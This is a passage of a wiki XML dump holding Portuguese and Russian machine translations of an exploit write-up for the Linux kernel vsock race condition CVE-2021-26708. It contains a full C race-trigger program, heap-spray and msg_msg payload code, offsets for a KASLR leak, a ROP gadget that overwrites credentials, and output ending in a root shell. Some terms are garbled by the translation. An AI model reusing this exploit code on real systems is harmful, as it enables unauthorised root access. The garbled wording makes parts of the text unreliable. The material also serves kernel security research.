        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
Mas como usar msg_msg para ler os dados do kernel? Ao ler a documentação da chamada do sistema msgrcv (), encontrei uma boa solução, usando sinalizadores msgrcv () e MSG:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
Este sinalizador faz com que o kernel copie os dados da mensagem para o espaço do usuário sem excluí-los da fila de mensagens. Se o kernel tiver CONFIG_CHECKPOINT_RESTORE = y, então MSG está disponível e é aplicável no Fedora Server.

=== Etapas de leitura arbitrária ===

Pronto para trabalhar:
Use sched_getaffinity () e CPU_COUNT () para calcular o número de CPUs disponíveis (pelo menos dois são necessários para esta vulnerabilidade);
Abra / dev / kmsg para análise;
mmap () configura userfaultfd () na área de memória spray_data como a última parte;
Inicie um pthread separado para lidar com eventos userfaultfd ();
Inicie 127 threads para setxattr () &amp; userfaultfd () heap spray em msg_msg, e pendure-os em thread_barrier;
Obtenha o endereço do kernel do msg_msg original:
Competição condicional em soquetes virtuais;
Após o segundo connect (), espere 35 microssegundos no loop ocupado;
Chame msgsnd () para criar uma fila de mensagens separada; após corrupção de memória, o objeto msg_msg é colocado na posição virtio_vsock_sock;
Analise o log do kernel e salve o endereço do kernel de msg_msg do aviso do kernel (registro RCX);
Ao mesmo tempo, salve o endereço do kernel de vsock_sock do registro RBX;
Use o msg_msg danificado para realizar a liberação arbitrária do msg_msg original:
Use 4 bytes do endereço msg_msg original como SO_VM_SOCKETS_BUFFER_SIZE para obter corrupção de memória;
Competição condicional em soquetes virtuais;
Chame msgsnd () imediatamente após o segundo connect (); msg_msg é colocado na posição de virtio_vsock_sock para atingir a destruição;
O ponteiro de segurança do msg_msg agora destruído armazena o endereço do msg_msg original (da etapa 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

Se a corrupção da memória msg_msg.security do thread setsockopt () ocorrer durante o processamento de msgsnd (), a verificação de permissão SELinux falha;
Neste caso, msgsnd () retorna -1, e o msg_msg danificado é destruído; liberar msg_msg.security pode liberar o msg_msg original;
Substitua o msg_msg original por uma carga controlável:
Depois que msgsnd () falhar, a vulnerabilidade chamará pthread_barrier_wait () e chamará 127 pthreads para pulverização de heap;
Esses pthreads executam a carga útil de setxattr ();
O msg_msg original é sobrescrito por dados controláveis, e o ponteiro msg_msg.next armazena o endereço do objeto vsock_sock;

[[File:T0140baae964febb059.png | 600px ]]

Leia o conteúdo do objeto do kernel vsock_sock para o espaço do usuário, recebendo a mensagem da fila de mensagens armazenando o msg_msg substituído:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

== Encontre o alvo do ataque ==

Aqui estão os pontos que encontrei:
1. Cache de bloco dedicado, como PINGv6 e sock_inode_cache tem muitos ponteiros para objetos
2. O ponteiro de struct mem_cgroup * sk_memcg está no deslocamento 664 em vsock_sock.sk. A estrutura mem_cgroup é alocada no cache de bloco kmalloc-4k.
3. O ponteiro const struct cred * owner está no deslocamento 840 de vsock_sock.sk e armazena o endereço da credencial que pode ser sobrescrito para escalonamento de permissão.
4. O ponteiro de função void (* sk_write_space) (struct sock *) está no deslocamento 688 de vsock_sock.sk e é definido como o endereço da função de kernel sock_def_write_space (). Ele pode ser usado para calcular o deslocamento KASLR.

Aqui está como a vulnerabilidade extrai esses ponteiros da memória:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

== Implementar Use-after-free em sk_buff ==

O buffer relacionado à rede no kernel do Linux é representado por struct sk_buff. Há skb_shared_info e destructor_arg neste objeto, que pode ser usado para sequestro de fluxo de controle. Os dados de rede e skb_shared_info são colocados no mesmo bloco de memória do kernel apontado por sk_buff.head. Portanto, a criação de um pacote de rede de 2.800 bytes no espaço do usuário fará com que skb_shared_info seja alocado para o cache de bloco kmalloc-4k, assim como o objeto mem_cgroup.

Eu criei as seguintes etapas:

1. Use sockets (AF_INET, SOCK_DGRAM, IPPROTO_UDP) para criar um socket de cliente e 32 sockets de servidor

2. Prepare um buffer de 2.800 bytes no espaço do usuário e use 0x42 para memset ()

3. Use sendto () para enviar este buffer do socket do cliente para cada socket do servidor para criar objetos sk_buff em kmalloc-4k. Use `sched_setaffinity () em cada CPU disponível

4. Execute o processo de leitura arbitrária em vsock_sock

5. Calcule o possível endereço do kernel sk_buff como sk_memcg mais 4096 (o próximo elemento de kmalloc-4k)

6. Execute leituras arbitrárias neste possível endereço sk_buff

7. Se você encontrar 0x42424242424242lu na localização dos dados da rede, encontre o sk_buff real e vá para a etapa 8. Caso contrário, adicione 4096 ao endereço sk_buff possível e vá para a etapa 6

8. Execute o heap spray setxattr () &amp; userfaultfd () de 32 pthreads em sk_buff e pendure-os em pthread_barrier

9. Liberar arbitrariamente o endereço do kernel sk_buff

10. Chame pthread_barrier_wait (), execute 32 setxattr () para cobrir o heap spray pthreads de skb_shared_info

11. Use recv () para receber mensagens de rede do soquete do servidor.

== Escrevendo livremente através de skb_shared_info ==

A seguir está uma carga útil válida que substitui o objeto sk_buff:

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info reside nos dados de injeção, exatamente no deslocamento SKB_SHINFO_OFFSET, que é 3776 bytes. O ponteiro skb_shared_info.destructor_arg armazena o endereço de struct ubuf_info. Como o endereço do kernel do sk_buff atacado é conhecido, um ubuf_info falso pode ser criado em MY_UINFO_OFFSET no buffer de rede. A seguir está o layout de uma carga útil válida:

[[File:T0185ccbf9f025c74da.png  | 600px]]

Vamos falar sobre o retorno de chamada destructor_arg:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

Como não consegui encontrar um gadget que atendesse às minhas necessidades em vmlinuz-5.10.11-200.fc33.x86_64, pesquisei e construí sozinho.

O ponteiro da função de retorno de chamada armazena o endereço de um dispositivo ROP, o RDI armazena o primeiro parâmetro da função de retorno de chamada, que é o endereço do próprio ubuf_info, e RDI + 8 aponta para ubuf_info.desc. gadget move ubuf_info.desc para RDX. Agora o RDX contém o ID do usuário efetivo e o endereço do ID do grupo menos um byte. Este byte é muito importante: quando o gadget grava a mensagem 1 do RSI na memória apontada pelo RDX, o uid e o gid efetivos serão sobrescritos com zero. Repita o mesmo processo até que os privilégios sejam atualizados para root. O fluxo de saída de todo o processo é o seguinte:
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

== Vídeo ==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


== Referência ==
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>9mqntzrtkmzj8yzkydmtq9zick2cy7j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/ru</title>
    <ns>0</ns>
    <id>2041</id>
    <revision>
      <id>2466</id>
      <timestamp>2021-05-05T06:05:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "7. Если вы найдете 0x42424242424242lu в расположении сетевых данных, найдите настоящий sk_buff и переходите..."</comment>
      <origin>2466</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="33411" sha1="efg3o2l0g8ua9fxrzhjfkqg9lrxulc4" xml:space="preserve">&lt;languages  /&gt;
== Уязвимость ==

Эти уязвимости представляют собой состояния гонки, вызванные неправильной блокировкой в ​​&lt;code&gt; net / vmw_vsock / af_vsock.c &lt;/code&gt;. Эти условные соревнования были неявно представлены в заявке, в которой в ноябре 2019 года была добавлена ​​поддержка мульти-транспорта VSOCK, и были объединены в версию ядра Linux 5.5-rc1.

&lt;code&gt; CONFIG_VSOCKETS &lt;/code&gt; и &lt;code&gt; CONFIG_VIRTIO_VSOCKETS &lt;/code&gt; предоставляются как модули ядра во всех основных дистрибутивах GNU / Linux. Когда вы создаете сокет для домена AF_VSOCK, эти уязвимые модули загружаются автоматически.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

Создание сокетов &lt;code&gt; AF_VSOCK &lt;/code&gt; доступно для непривилегированных пользователей и не требует пространства для имени пользователя.


== Повреждение памяти ==

Ниже приводится подробное введение в использование CVE-2021-26708 с использованием условного соревнования в &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt;. Для воспроизведения требуются два потока. Первый поток вызывает &lt;code&gt; setsockopt () &lt;/code&gt;
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



Второй поток изменяет передачу виртуального сокета, когда &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt; пытается получить блокировку сокета, повторно подключив виртуальный сокет:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Для обработки &lt;code&gt; connect () &lt;/code&gt; виртуального сокета ядро ​​выполняет &lt;code&gt; vsock_stream_connect () &lt;/code&gt;, который вызывает &lt;code&gt; vsock_assign_transport () &lt;/code&gt;. Эта функция содержит следующий код:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt; vsock_stream_connect () &lt;/code&gt; содержит блокировку сокета, а &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; в параллельном потоке также пытается получить его, что составляет условное соревнование. Следовательно, когда второй &lt;code&gt; connect () &lt;/code&gt; выполняется с другим &lt;code&gt; svm_cid &lt;/code&gt;, вызывается функция &lt;code&gt; vsock_deassign_transport () &lt;/code&gt;. Эта функция выполняет &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;, освобождает &lt;code&gt; vsock_sock.trans &lt;/code&gt;, а для &lt;code&gt; vsk-&gt; transport &lt;/code&gt; устанавливается значение NULL. Когда &lt;code&gt; vsock_stream_connect () &lt;/code&gt; освобождает блокировку сокета, &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; может продолжить выполнение. Он вызывает &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt;, а затем вызывает &lt;code&gt; transport-&gt; notify_buffer_size () &lt;/code&gt;. Здесь транспорт содержит устаревшее значение из локальной переменной, которое не соответствует &lt;code&gt; vsk-&gt; transport &lt;/code&gt; (исходное значение установлено в NULL).

Когда ядро ​​выполняет &lt;code&gt; virtio_transport_notify_buffer_size () &lt;/code&gt;, происходит повреждение памяти:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Здесь vvs - это указатель на память ядра, которая была освобождена в &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;. Размер &lt;code&gt; struct virtio_vsock_sock &lt;/code&gt; составляет 64 байта и находится в блочном кэше kmalloc-64. Тип поля buf_alloc - u32, он расположен по смещению 40. &lt;code&gt; VIRTIO_VSOCK_MAX_BUF_SIZE - 0xFFFFFFFFUL &lt;/code&gt;. Значение * val контролируется злоумышленником, и его четыре наименее важных байта записываются в освобожденную память.


== Нечеткое изображение ==

Фаззер syzkaller не может воспроизвести этот сбой, поэтому я решил изучить его сам. Но почему выходит из строя фаззер? Наблюдайте за &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; и узнайте:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;code&gt; notify_buffer_size () &lt;/code&gt; будет вызываться только тогда, когда val отличается от текущего buffer_size, то есть когда &lt;code&gt; setsockopt () &lt;/code&gt; выполняет &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, каждый раз параметры размера вызова должны быть разными. Итак, я построил соответствующий код:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

Значение размера здесь берется из количества наносекунд, возвращаемого функцией &lt;code&gt; clock_gettime () &lt;/code&gt;, которое каждый раз может быть разным. Исходный syzkaller этого не делает, потому что, когда syzkaller генерирует ввод фаззинга, значение параметра syscall определяется и не изменяется во время выполнения.

== Мощность четырех байтов ==

Здесь я выбрал Fedora 33 Server в качестве объекта исследования, версия ядра - 5.10.11-200.fc33.x86_64, и я намерен обойти SMEP и SMAP.

На первом этапе я начал изучать распыление стабильной кучи, которое использовало выполнение действий в пользовательском пространстве, чтобы ядро ​​выделяло другой 64-байтовый объект в местоположении выпущенного virtio_vsock_sock. После нескольких экспериментальных попыток было подтверждено, что выпущенный файл virtio_vsock_sock был перезаписан, что указывает на возможность распыления кучи. Наконец я нашел системный вызов msgsnd (). Он создает структуру msg_msg в пространстве ядра, см. Вывод pahole:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

Передняя часть - это заголовок сообщения, а задняя - данные сообщения. Если struct msgbuf в пользовательском пространстве имеет 16-байтовый mtext, соответствующий msg_msg будет создан в блочном кэше kmalloc-64. 4-байтовая запись после освобождения уничтожит указатель защиты void * по смещению 40. Поле msg_msg.security указывает на данные ядра, выделенные lsm_msg_msg_alloc (). Когда msg_msg получено, оно будет выпущено security_msg_msg_free (). Следовательно, уничтожив первую половину указателя защиты, можно получить произвольное освобождение.

== Утечка информации о ядре ==

Здесь используется [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D % 87% E6% BC% 8F% E6% B4% 9E CVE-2019-18683] тот же метод. Второй connect () виртуального сокета вызывает &lt;code&gt; vsock_deassign_transport () &lt;/code&gt; и устанавливает для &lt;code&gt; vsk-&gt; transport &lt;/code&gt; значение NULL, в результате чего &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; Вызов &lt;code &gt; virtio_transport_send_pkt_info () &lt;/code&gt; после сбоя памяти появляется предупреждение ядра:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
При отладке gdb обнаруживается, что регистр RCX содержит адрес ядра выпущенного virtio_vsock_sock, а регистр RBX содержит адрес ядра vsock_sock.

== Достичь произвольного чтения ==

arbitrary free -- use-after-free

Освободить объект из просочившегося адреса ядра
Провести кучное распыление и покрыть объект контролируемыми данными
Использовать поврежденные объекты для повышения привилегий
Сообщение System V, реализованное ядром, имеет максимальный предел DATALEN_MSG, то есть PAGE_SIZE минус sizeof (struct msg_msg)). Если вы отправляете сообщение большего размера, оставшиеся сообщения будут сохранены в списке сегментов сообщения. Msg_msg содержит структуру msg_msgseg * рядом с первым сегментом, а size_t m_ts используется для хранения размера. При выполнении операции перезаписи вы можете поместить контролируемое значение в msg_msg.m_ts и msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
Но как использовать msg_msg для чтения данных ядра? Прочитав документацию по системному вызову msgrcv (), я нашел хорошее решение, использующее флаги msgrcv () и MSG:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
Этот флаг заставляет ядро ​​копировать данные сообщения в пространство пользователя, не удаляя их из очереди сообщений. Если ядро ​​имеет CONFIG_CHECKPOINT_RESTORE = y, то MSG доступна и применима в Fedora Server.

=== Шаги произвольного чтения ===

Готов к работе:
Используйте sched_getaffinity () и CPU_COUNT () для расчета количества доступных процессоров (для этой уязвимости требуется как минимум два);
Откройте / dev / kmsg для анализа;
mmap () настраивает userfaultfd () в области памяти spray_data в качестве последней части;
Запустите отдельный поток pthread для обработки событий userfaultfd ();
Запустить 127 потоков для setxattr () и userfaultfd () heap spray на msg_msg и повесить их на thread_barrier;
Получите адрес ядра исходного msg_msg:
Условное соревнование по виртуальным розеткам;
После второго подключения () подождите 35 микросекунд в цикле занятости;
Вызовите msgsnd (), чтобы создать отдельную очередь сообщений; после повреждения памяти объект msg_msg помещается в позицию virtio_vsock_sock;
Проанализируйте журнал ядра и сохраните адрес ядра msg_msg из предупреждения ядра (регистр RCX);
В то же время сохраните адрес ядра vsock_sock из регистра RBX;
Используйте поврежденный msg_msg для произвольного освобождения исходного msg_msg:
Используйте 4 байта исходного адреса msg_msg как SO_VM_SOCKETS_BUFFER_SIZE, чтобы добиться повреждения памяти;
